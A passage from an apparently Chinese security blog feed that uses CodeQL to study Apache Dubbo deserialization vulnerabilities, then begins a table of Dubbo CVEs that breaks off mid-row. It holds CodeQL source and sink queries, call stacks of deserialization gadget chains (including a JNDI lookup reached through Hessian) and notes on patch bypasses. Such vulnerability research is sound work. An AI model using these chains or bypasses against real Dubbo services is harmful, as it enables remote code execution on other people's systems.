class="string">&quot;Argument[this].MapValue&quot;</span>, <span class="string">&quot;value&quot;</span>, <span class="string">&quot;manual&quot;</span>]</span><br><span class="line"><span class="bullet">-</span> [<span class="string">&quot;java.util&quot;</span>, <span class="string">&quot;Map&quot;</span>, <span class="literal">True</span>, <span class="string">&quot;computeIfAbsent&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Argument[1].ReturnValue&quot;</span>, <span class="string">&quot;ReturnValue&quot;</span>, <span class="string">&quot;value&quot;</span>, <span class="string">&quot;manual&quot;</span>]</span><br></pre></td></tr></table></figure><p>但是显然不能够将result value和u 污点关联起来，因为categoryList类似于引用调用，污点传播在后，可以传播到<code>categoryList.add(u);</code> 这里的<code>u</code>，这应该是CodeQL的通用问题。</p><blockquote><p>引用类型的无解</p></blockquote><h3 id="8-4-QL-Result"><a href="#8-4-QL-Result" class="headerlink" title="8.4 QL Result"></a>8.4 QL Result</h3><blockquote><p>目前认为无解<br>TODO，computeIfAbsent这种写法还挺多，暂时考虑手动串起来</p></blockquote><h2 id="0x09-GHSL-2021-094"><a href="#0x09-GHSL-2021-094" class="headerlink" title="0x09 GHSL-2021-094"></a>0x09 GHSL-2021-094</h2><blockquote><p>CVE-2021-36162<br>GHSL-2021-094 Dubbo在2.7.10中修复了snakeYaml的反序列化问题，但是3.0新Router机制Mesh中依然存在snakeYaml反序列化</p></blockquote><h3 id="9-1-Source"><a href="#9-1-Source" class="headerlink" title="9.1 Source"></a>9.1 Source</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">Yaml yaml2 = <span class="keyword">new</span> Yaml();</span><br><span class="line">Iterable&lt;Object&gt; objectIterable = yaml.loadAll(configInfo);</span><br><span class="line"><span class="keyword">for</span> (Object result : objectIterable) &#123;</span><br><span class="line"></span><br><span class="line">    Map resultMap = (Map) result;</span><br></pre></td></tr></table></figure><p>用的还不是Yaml#load 接口，而是Yaml#loadAll</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;    </span><br><span class="line">  exists( MethodAccess ma|</span><br><span class="line">    ma.getMethod().getName() in [&quot;load&quot;, &quot;loadAll&quot;]</span><br><span class="line">    and ma.getAnArgument() &#x3D; sink.asExpr()</span><br><span class="line">    and ma.getReceiverType().getASourceSupertype*().hasQualifiedName(&quot;org.yaml.snakeyaml&quot;, &quot;Yaml&quot;)</span><br><span class="line">  )</span><br><span class="line">  and not sink.getLocation().getFile().getRelativePath().matches(&quot;%&#x2F;src&#x2F;test&#x2F;%&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-2-QL-Result"><a href="#9-2-QL-Result" class="headerlink" title="9.2 QL Result"></a>9.2 QL Result</h3><p>但是细看调用栈，会发现经过了notify#AbstractRegistry，和GHSL-2021-042一样，暂时无解</p><blockquote><p>TODO：手动临时串起来</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">next:547, Yaml$1 (org.yaml.snakeyaml)</span><br><span class="line">receiveConfigInfo:62, MeshAppRuleListener (org.apache.dubbo.rpc.cluster.router.mesh.route)</span><br><span class="line">subscribeAppRule:53, MeshRuleManager (org.apache.dubbo.rpc.cluster.router.mesh.route)</span><br><span class="line">notify:43, MeshRuleAddressListenerInterceptor (org.apache.dubbo.rpc.cluster.router.mesh.route)</span><br><span class="line">notify:145, RegistryDirectory (org.apache.dubbo.registry.integration)</span><br><span class="line">notify:433, AbstractRegistry (org.apache.dubbo.registry.support)</span><br><span class="line">doNotify:371, FailbackRegistry (org.apache.dubbo.registry.support)</span><br><span class="line">notify:363, FailbackRegistry (org.apache.dubbo.registry.support)</span><br><span class="line">doSubscribe:180, ZookeeperRegistry (org.apache.dubbo.registry.zookeeper)</span><br><span class="line">subscribe:298, FailbackRegistry (org.apache.dubbo.registry.support)</span><br><span class="line">subscribe:106, ListenerRegistryWrapper (org.apache.dubbo.registry)</span><br><span class="line">subscribe:107, RegistryDirectory (org.apache.dubbo.registry.integration)</span><br><span class="line">doCreateInvoker:514, RegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">getInvoker:58, InterfaceCompatibleRegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">refreshInterfaceInvoker:448, MigrationInvoker (org.apache.dubbo.registry.client.migration)</span><br><span class="line">migrateToApplicationFirstInvoker:239, MigrationInvoker (org.apache.dubbo.registry.client.migration)</span><br><span class="line">refreshInvoker:73, MigrationRuleHandler (org.apache.dubbo.registry.client.migration)</span><br><span class="line">doMigrate:57, MigrationRuleHandler (org.apache.dubbo.registry.client.migration)</span><br><span class="line">onRefer:208, MigrationRuleListener (org.apache.dubbo.registry.client.migration)</span><br><span class="line">interceptInvoker:485, RegistryProtocol (org.apache.dubbo.registry.integration)</span><br></pre></td></tr></table></figure><h2 id="0x10-GHSL-2021-095"><a href="#0x10-GHSL-2021-095" class="headerlink" title="0x10 GHSL-2021-095"></a>0x10 GHSL-2021-095</h2><blockquote><p>CVE-2021-36163<br>GHSL-2021-095 Dubbo还支持Hessian协议（并不是指反序列化），基于http，在HessianSkeleton 的处理中会对POST 的内容进行反序列化</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">doInContext:155, JndiTemplate$1 (org.springframework.jndi)</span><br><span class="line">execute:87, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:152, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:179, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:95, JndiLocatorSupport (org.springframework.jndi)</span><br><span class="line">doGetSingleton:218, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getBean:112, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getAdvice:109, AbstractBeanFactoryPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">equals:74, AbstractPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">putVal:634, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">readMap:114, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:522, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:2079, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">readLengthList:599, BasicDeserializer (com.caucho.hessian.io)</span><br><span class="line">readObject:1746, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">invoke:300, HessianSkeleton (com.caucho.hessian.server)</span><br><span class="line">invoke:202, HessianSkeleton (com.caucho.hessian.server)</span><br><span class="line">invoke:143, HessianSkeleton (com.caucho.hessian.server)</span><br><span class="line">handle:193, HessianProtocol$HessianHandler (org.apache.dubbo.rpc.protocol.hessian)</span><br><span class="line">service:61, DispatcherServlet (org.apache.dubbo.remoting.http.servlet)</span><br><span class="line">service:790, HttpServlet (javax.servlet.http)</span><br><span class="line">handle:865, ServletHolder (org.eclipse.jetty.servlet)</span><br></pre></td></tr></table></figure><h3 id="10-1-Source"><a href="#10-1-Source" class="headerlink" title="10.1 Source"></a>10.1 Source</h3><p>调用栈可以看出是Serverlet Source</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DispatcherServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        HttpHandler handler = HANDLERS.get(request.getLocalPort());</span><br><span class="line">        <span class="keyword">if</span> (handler == <span class="keyword">null</span>) &#123;<span class="comment">// service not found.</span></span><br><span class="line">            response.sendError(HttpServletResponse.SC_NOT_FOUND, <span class="string">&quot;Service not found.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            handler.handle(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source instanceof RemoteFlowSource</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-660.png" alt="upload successful"></p><h4 id="10-1-1-Where-is-Source-Module-HttpServletRequest-getInputStream-Defined？"><a href="#10-1-1-Where-is-Source-Module-HttpServletRequest-getInputStream-Defined？" class="headerlink" title="10.1.1 Where is Source Module HttpServletRequest#getInputStream Defined？"></a>10.1.1 Where is Source Module HttpServletRequest#getInputStream Defined？</h4><p>为什么在FlowSources.qll 中没有extends RemoteFlowSource的相关Servlet，为何以上的ql能直接定位到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private class ExternalRemoteFlowSource extends RemoteFlowSource &#123;</span><br><span class="line">  ExternalRemoteFlowSource() &#123; sourceNode(this, &quot;remote&quot;) &#125;</span><br><span class="line"></span><br><span class="line">  override string getSourceType() &#123; result &#x3D; &quot;external&quot; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在java/ql/lib/ext/javax.servlet.model.yml 中</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> [<span class="string">&quot;javax.servlet&quot;</span>, <span class="string">&quot;ServletRequest&quot;</span>, <span class="literal">False</span>, <span class="string">&quot;getInputStream&quot;</span>, <span class="string">&quot;()&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;ReturnValue&quot;</span>, <span class="string">&quot;remote&quot;</span>, <span class="string">&quot;manual&quot;</span>]</span><br></pre></td></tr></table></figure><blockquote><p>疑问：注意这里subteyps=Flase，为什么HttpServletRequest 也能够适用呢</p></blockquote><p><img src="/images/pasted-661.png" alt="upload successful"></p><p>在java/ql/lib/ext/javax.servlet.http.model.yml 中，并无HttpServletRequest#getInputStream 的记录</p><p>具体是在哪里添加的getInputStream 这个Source点呢？</p><p>注释掉javax.servlet.model.yml 中的ServletRequest getInputStream一行，发现RemoteFlowSource的确结果中没有了</p><h5 id="subteyps"><a href="#subteyps" class="headerlink" title="subteyps"></a>subteyps</h5><p>查看HttpServletRequest发现并未重写getInputStream，因此subteyps实际还用的是ServletRequest getInputStream，注意这点：<strong>subyptes=False并不是表示”子类不适用这条规则”</strong></p><blockquote><p>引用师傅的结论：<br>subtypes:布尔类型,可以取值为true或false. 当为true时, 会寻找子类重写的类型成员name(使用<br>overridesOrInstantiates 谓词得到). 否则寻找当前类类型成员name</p></blockquote><p>师傅看的真仔细。</p><p>ExternalFlow.qll</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exists(Member m |</span><br><span class="line">  (</span><br><span class="line">    result &#x3D; m</span><br><span class="line">    or</span><br><span class="line">    subtypes &#x3D; true and result.(SrcMethod).overridesOrInstantiates+(m)</span><br><span class="line">  ) </span><br></pre></td></tr></table></figure><blockquote><p>疑问：result = m，CodelQL 父类的member也是子类的Member吗</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from Member m</span><br><span class="line">where m.getFile().toString() &#x3D; &quot;HttpServletRequest&quot;</span><br><span class="line">select m</span><br><span class="line">    , m.getFile()</span><br></pre></td></tr></table></figure><p>并没有getInputStream</p><blockquote><p>结论：不是</p></blockquote><blockquote><p>注意此处的and or 逻辑，与传统的语言顺序执行不同，这里的实际逻辑如下：<br>result = m<br>or (subtypes = true and result.(SrcMethod).overridesOrInstantiates+(m))</p></blockquote><p>Member.qll</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">predicate overridesOrInstantiates(Method m) &#123;</span><br><span class="line">  this.overrides(m)</span><br><span class="line">  or</span><br><span class="line">  this.getSourceDeclaration() &#x3D; m and this !&#x3D; m</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>overridesOrInstantiates的逻辑为重写或者实现</p><p>个人理解subtypes的逻辑是针对Method member的：</p><ol><li>如果为false<ul><li>那么只对当前method member有效</li></ul></li><li>如果为true<ul><li>当前method member</li><li>所有重写/实现了该method的method</li></ul></li></ol><blockquote><p>疑问：HttpServletRequest extends ServletRequest，其本身也是个interface，为什么也有？</p></blockquote><p>想想trap 的生成逻辑，JavaCompiler Visitor，在编译的时候，HttpServletRequest#getInputStream()，HttpServletRequest并没有getInputStream，实际上是父类的getInputStream，因此即使subtypes=false，如果没有重写method，那么子类调用该method，还是可以认为该规则生效。</p><ul><li>子类subclass 重写/实现了method，针对subclass#method的MethodCallExpr，subtypes=True 时该条规则才会命中</li><li>子类subclass 没有重写/实现method，一直生效，和subtypes无关</li></ul><h3 id="10-2-Sink"><a href="#10-2-Sink" class="headerlink" title="10.2 Sink"></a>10.2 Sink</h3><p>Sink点不是普通的Hessian2反序列化Hessian2Input#readObject, 而是HessianSkeleton#invoke</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> [<span class="string">&quot;com.caucho.hessian.server&quot;</span>, <span class="string">&quot;HessianSkeleton&quot;</span>, <span class="literal">False</span>, <span class="string">&quot;invoke&quot;</span>, <span class="string">&quot;(InputStream,OutputStream)&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Argument[0]&quot;</span>, <span class="string">&quot;deserilization&quot;</span>, <span class="string">&quot;manual&quot;</span>]</span><br></pre></td></tr></table></figure><blockquote><p>注意：(InputStream,OutputStream) 中间无空格</p></blockquote><h3 id="10-3-QL-Result"><a href="#10-3-QL-Result" class="headerlink" title="10.3 QL Result"></a>10.3 QL Result</h3><p><img src="/images/pasted-662.png" alt="upload successful"></p><h2 id="0x11-GHSL-2021-096"><a href="#0x11-GHSL-2021-096" class="headerlink" title="0x11 GHSL-2021-096"></a>0x11 GHSL-2021-096</h2><blockquote><p>GHSL-2021-096<br>GHSL-2021-096 Dubbo还支持rmi协议，Dobbo的Provider类似RMI的Register和Provider，可以用Client攻击Register和Provider的方式进行攻击</p></blockquote><h3 id="11-1-Sink"><a href="#11-1-Sink" class="headerlink" title="11.1 Sink"></a>11.1 Sink</h3><p>逻辑在org.apache.dubbo.rpc.protocol.rmi.RmiProtocol 内，用的org.springframework.remoting.rmi.RmiServiceExporter 实现RMI Register</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.remoting.rmi.RmiServiceExporter;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RmiProtocol</span> <span class="keyword">extends</span> <span class="title">AbstractProxyProtocol</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> &lt;T&gt; <span class="function">RmiServiceExporter <span class="title">createExporter</span><span class="params">(T impl, Class&lt;?&gt; type, URL url, <span class="keyword">boolean</span> isGeneric)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> RmiServiceExporter rmiServiceExporter = <span class="keyword">new</span> RmiServiceExporter();</span><br><span class="line">        rmiServiceExporter.setRegistryPort(url.getPort());</span><br><span class="line">        <span class="keyword">if</span> (isGeneric) &#123;</span><br><span class="line">            rmiServiceExporter.setServiceName(url.getPath() + <span class="string">&quot;/&quot;</span> + GENERIC_KEY);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            rmiServiceExporter.setServiceName(url.getPath());</span><br><span class="line">        &#125;</span><br><span class="line">        rmiServiceExporter.setServiceInterface(type);</span><br><span class="line">        rmiServiceExporter.setService(impl);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            rmiServiceExporter.afterPropertiesSet();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RpcException(e.getMessage(), e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> rmiServiceExporter;</span><br></pre></td></tr></table></figure><p>这种无法写污点分析，没有污点源，只要启动了rmi server就有问题</p><blockquote><p>从main 到 RmiServiceExporter getEnclosingCallable ?是不是可以为污点分析</p></blockquote><h3 id="11-2-QL-Result"><a href="#11-2-QL-Result" class="headerlink" title="11.2 QL Result"></a>11.2 QL Result</h3><h4 id="11-2-1-DataFlow-Node-Tip"><a href="#11-2-1-DataFlow-Node-Tip" class="headerlink" title="11.2.1 DataFlow::Node Tip"></a>11.2.1 DataFlow::Node Tip</h4><blockquote><p>注: DataFlow::Node 可能指的是最小节点或者深度为1的节点，比如最下层的MethodAccess，如果嵌套则不包含上层</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;    </span><br><span class="line">    exists( MethodAccess ma| </span><br><span class="line">        ma &#x3D; sink.asExpr()</span><br><span class="line">        and sink.asExpr().getFile().getRelativePath().matches(&quot;%RmiProtocol.java&quot;)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如以上的ql 命中不了setRegistryPort<br><img src="/images/pasted-663.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;    </span><br><span class="line">sink.asExpr().getFile().getRelativePath().matches(&quot;%RmiProtocol.java&quot;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-664.png" alt="upload successful"></p><h4 id="11-2-2-Final-QL"><a href="#11-2-2-Final-QL" class="headerlink" title="11.2.2 Final QL"></a>11.2.2 Final QL</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;    </span><br><span class="line">    exists( MethodAccess ma| ma.getAChildExpr() &#x3D; sink.asExpr() or ma &#x3D; sink.asExpr() | </span><br><span class="line">        ma.getMethod().getDeclaringType().hasQualifiedName(&quot;org.springframework.remoting.rmi&quot;, &quot;RmiServiceExporter&quot;)</span><br><span class="line">        and ma.getMethod().hasName(&quot;setRegistryPort&quot;)</span><br><span class="line">    )</span><br><span class="line">    or </span><br><span class="line">    exists( MethodAccess ma| ma.getAChildExpr() &#x3D; sink.asExpr() or ma &#x3D; sink.asExpr() | </span><br><span class="line">      ma.getMethod().getDeclaringType().hasQualifiedName(&quot;java.rmi.registry&quot;, &quot;LocateRegistry&quot;)</span><br><span class="line">      and ma.getMethod().hasName(&quot;createRegistry&quot;)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x12-GHSL-2021-096"><a href="#0x12-GHSL-2021-096" class="headerlink" title="0x12 GHSL-2021-096"></a>0x12 GHSL-2021-096</h2><blockquote><p>CVE-2021-37579<br>GHSL-2021-097 CodecSupport#checkSerialization bypass，该安全策略用于判断dubbo数据包指定的序列化方式是否是provider配置的配置，当version不存在时，会绕过检测漏洞</p></blockquote><p>个人认为CodeQL不适合做bypass工作，暂时忽略</p><h2 id="0x13-CVE-2021-43297"><a href="#0x13-CVE-2021-43297" class="headerlink" title="0x13 CVE-2021-43297"></a>0x13 CVE-2021-43297</h2><blockquote><p>hessian-lite 作为dubbo内置的hessian版本，在处理异常的时候，会通过”+”进行字符串拼接，导致其中obj的toString 隐式调用，形成反序列化(也可以认为是CVE-2021-30179的补充)</p></blockquote><p>部分重点的调用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readString:1853, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readUTF:79, Hessian2ObjectInput (com.alibaba.dubbo.common.serialize.hessian2)</span><br><span class="line">decode:97, DecodeableRpcInvocation (com.alibaba.dubbo.rpc.protocol.dubbo)</span><br></pre></td></tr></table></figure><p>其实在<a href="#GHSL-2021-096">GHSL-2021-096</a>中就有这条链</p><p><img src="/images/pasted-665.png" alt="upload successful"></p><h2 id="0x14-CVE-2023-23638"><a href="#0x14-CVE-2023-23638" class="headerlink" title="0x14 CVE-2023-23638"></a>0x14 CVE-2023-23638</h2><blockquote><p>CVE-2021-30179的绕过，可以利用setter设置全局静态配置变量，绕过安全规则</p></blockquote><p>个人认为CodeQL不适合做bypass工作，暂时忽略</p><h2 id="0x15-小结"><a href="#0x15-小结" class="headerlink" title="0x15 小结"></a>0x15 小结</h2><p>遗留问题：</p><ol><li>5.1.3 GHSL-2021-037/GHSL-2021-038一节中，如何把implements Runnable中的&lt;init&gt; 和run 关联起来？</li><li>5.3.2 中，即使存在强制类型，污点仍然为Object</li><li>zookeeper source forPath怎么转换成yml sourceModule？</li><li>computeIfAbsent 这种引用传播，污点如何串起来</li><li>netInstance &amp; setter/getter ql实现</li></ol><h2 id="0x16-参考"><a href="#0x16-参考" class="headerlink" title="0x16 参考"></a>0x16 参考</h2><ul><li>[1] <a href="https://securitylab.github.com/research/apache-dubbo/">Apache Dubbo: All roads lead to RCE</a></li><li>[2] <a href="https://mp.weixin.qq.com/s/B-uhbd5FApxSXnjPEFzArQ">使用 CodeQL 分析 Dubbo RCE</a></li><li>[3] <a href="https://blog.csdn.net/tobrainto/article/details/118501777">org.jboss.netty 和 io.netty 你分的清吗？Netty 版本的跃迁史</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;《Apache Dubbo: All roads lead to RCE》算是最早公开利用CodeQL 挖掘漏洞的文章，能够半自动化漏洞挖掘，难怪pwntester 祖师爷的产出能够如此高效。&lt;/p&gt;
&lt;h2 id=&quot;0x01-Dubbo背景&quot;&gt;&lt;a href=&quot;#0x01-Dubbo背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 Dubbo背景&quot;&gt;&lt;/a&gt;0x01 Dubbo背景&lt;/h2&gt;&lt;p&gt;Dubbo 的漏洞原理可以参考上一篇文章。&lt;/p&gt;
&lt;p&gt;环境：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Dubbo 2.7.8&lt;/li&gt;
&lt;li&gt;Codeql 2.13.1&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Codeql 一直在增加框架的支持，pwntester的这篇文章发布在2021年9月，在2023年5月2.13.1版本中，已经增加了对于Netty的Source支持。&lt;/p&gt;</summary>
    
    
    
    <category term="CodeQL" scheme="http://m0d9.me/categories/CodeQL/"/>
    
    
    <category term="CodeQL" scheme="http://m0d9.me/tags/CodeQL/"/>
    
    <category term="Dubbo" scheme="http://m0d9.me/tags/Dubbo/"/>
    
  </entry>
  
  <entry>
    <title>Apache Dubbo 历史漏洞分析与总结</title>
    <link href="http://m0d9.me/2023/03/20/Dubbo-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2023/03/20/Dubbo-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-03-20T06:12:00.000Z</published>
    <updated>2023-12-19T03:54:49.995Z</updated>
    
    <content type="html"><![CDATA[<table><thead><tr><th>链接</th><th>描述</th><th>影响版本</th><th>作者</th></tr></thead><tbody><tr><td><a href="#0x02-CVE-2019-17564">CVE-2019-17564</a></td><td>http协议，直接使用了Spring框架的<code>HttpInvokerServiceExporter</code>类做远程调用，而这个过程会读取POST请求的Body并进行反序列化</td><td>2.7.0&lt;=Dubbo&lt;=2.7.4<br>2.6.0&lt;=Dubbo&lt;=2.6.7<br>2.5.x</td><td><a href="https://lists.apache.org/thread/lgk1xhlgb8t3dmlw10rx7drxs00yspd2">Dor Tumarkin@Chekmarx</a></td></tr><tr><td><a href="#0x03-CVE-2020-1948">CVE-2020-1948</a></td><td>Dubbo默认hessian进行反序列化，未验证参数类型，任意object参数都会进行反序列化，实际修复不完整</td><td>2.7.0&lt;=Dubbo&lt;=2.7.6<br>2.6.0&lt;=Dubbo&lt;=2.6.7<br>2.5.x</td><td><a href="https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html">Ruilin</a></td></tr><tr><td><a href="#0x04-CVE-2020-11995">CVE-2020-11995</a></td><td>CVE-2020-1948 的绕过，参数类型验证保留了动态调用，$invoke\$invokeAsync\$echo 三个方法的参数仍然可例用，补丁修复仍然不全<a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-1-bypass-cve-2020-1948-mitigations-ghsl-2021-034">GHSL-2021-034</a>、<a href="https://securitylab.github.com/advisories/GHSL-2021-097-apache-dubbo/">GHSL-2021-097</a></td><td>2.7.0&lt;=Dubbo&lt;=2.7.8<br>2.6.0&lt;=Dubbo&lt;=2.6.8<br>2.5.x</td><td></td></tr><tr><td><a href="#0x05-CVE-2021-25641">CVE-2021-25641</a></td><td><a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-2-bypass-hessian2-allowlist-via-alternative-protocols-ghsl-2021-035">GHSL-2021-035</a> Dubbo除了支持hessian协议，还支持其他总共14协议，这些协议里面也有反序列化问题</td><td>dubbo-common&lt;=2.7.3<br>2.7.0&lt;=Dubbo&lt;=2.7.8<br>2.6.0&lt;=Dubbo&lt;=2.6.8<br>2.5.x</td><td><a href="https://lists.apache.org/thread/980x0wb42tghghwmskpcm47fc77936pp">Alvaro Munoz@GitHub Security Lab</a></td></tr><tr><td><a href="#0x06-GHSL-2021-036">GHSL-2021-036</a></td><td><a href="https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/#issue-3-pre-auth-rce-via-multiple-hessian-deserializations-in-the-rpc-invocation-decoder-ghsl-2021-036">GHSL-2021-036</a> Dubbo中数据流有很多途径到达hessian#readObject，pwntester首次在这里提出这条链readUTF-&gt;readString-&gt;expect-&gt;readObject，这个和后续的CVE-2021-43297异曲同工，而且更短</td><td>3.0.0&lt;=Dubbo&lt;=3.0.5<br>2.7.0&lt;=Dubbo&lt;=2.7.15<br>2.6.0&lt;=Dubbo&lt;=2.6.12</td><td><a href="https://lists.apache.org/thread/980x0wb42tghghwmskpcm47fc77936pp">Alvaro Munoz@GitHub Security Lab</a></td></tr><tr><td><a 